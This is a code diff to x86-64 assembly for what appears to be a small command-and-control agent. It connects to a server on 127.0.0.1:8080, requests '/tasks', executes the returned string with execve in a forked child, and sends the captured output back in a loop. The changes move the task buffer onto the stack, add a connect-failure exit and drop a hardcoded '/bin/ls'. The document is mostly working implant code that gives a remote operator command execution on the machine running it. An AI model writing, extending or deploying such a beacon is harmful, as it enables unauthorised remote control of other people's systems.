@@ -15,8 +15,6 @@ _start:
   push    DWORD   0x0100007F
   push    WORD    0x901F
   push    WORD    2
-  mov     [sockaddr], rsp
-  add     rsp,    0x14
 
 _request:
   ; socket()
@@ -27,27 +25,31 @@ _request:
   syscall
 
   ; connect()
+_tryConnect:
   mov     rdi,    rax
-  mov     rsi,    [sockaddr]
+  mov     rsi,    rsp
   mov     rdx,    DWORD 16
   mov     rax,    42
   syscall
+  test    rax,    rax
+  jz      _connOk
+  mov     rax,    60
+  xor     rdi,    rdi
+  syscall
 
-  mov     r14,    rdi
-
-  mov     rax,    1
-  mov     rdi,    r14
+_connOk:
+  inc     rax
   mov     rsi,    output
   mov     rdx,    0x400
   syscall
 
-  clearBuffer msgbuf
-
   ; read response
-  mov     rax,    0
-  mov     rsi,    msgbuf
+  xor     rax,    rax
+  sub     rsp,    0x400
+  mov     rsi,    rsp
   mov     rdx,    0x400
   syscall
+  mov     r14,    rdi
 
   ; pipe()
   mov     rax,    22
@@ -59,8 +61,8 @@ _request:
   syscall
   mov     [pid],  rax
 
-  cmp     rax,    0
-  je      _childProc
+  test    rax,    rax
+  jz      _childProc
 
 _parentProc:
   ; close write end
@@ -71,7 +73,7 @@ _parentProc:
   clearBuffer output
 
   ; read()
-  mov     rax,    0
+  xor     rax,    rax
   mov     rdi,    [fds]
   mov     rsi,    output
   mov     rdx,    0x400
@@ -93,6 +95,9 @@ _continue:
   mov     rdi,    r14
   syscall
 
+  clearBuffer rsp
+  add     rsp,    0x400
+
   jmp     _request
 
 _childProc:
@@ -112,7 +117,7 @@ _childProc:
 
   ; execve()
   mov     rax,    59
-  mov     rdi,    msgbuf
+  mov     rdi,    rsp
   xor     rsi,    rsi
   xor     rdx,    rdx
   syscall
@@ -133,9 +138,6 @@ section .bss
   msgbuf: resb    0x400
 
 section .data
-  cmd:
-    db "/bin/ls", 0h
-  cmd_len equ $ - cmd
   get_task_msg:
     db "GET /tasks HTTP/1.1", 0ah, 0ah, 0h
   get_task_len equ $ - get_task_msg
